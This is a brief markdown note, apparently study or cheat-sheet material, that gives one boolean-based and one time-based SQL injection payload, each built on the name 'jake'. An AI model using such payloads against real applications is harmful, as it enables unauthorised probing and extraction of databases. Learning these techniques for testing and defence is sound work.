
## Boolean-based SQLi

```
jake' AND 1=1 -- //
```

## Time-based SQLi

```
jake' AND IF (1=1, sleep(3),'false')
```